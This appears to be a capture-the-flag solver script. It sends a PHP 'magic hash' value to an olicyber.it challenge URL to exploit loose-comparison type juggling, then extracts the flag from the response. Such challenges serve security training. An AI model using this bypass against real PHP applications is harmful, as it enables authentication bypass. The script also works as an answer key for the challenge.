import requests
import re

URL = 'http://confuse-me.challs.olicyber.it/?input=0e215962017'

r = requests.get(URL)
flag = re.findall(r'flag\{.*?}', r.text)
if flag:
    print(flag[0])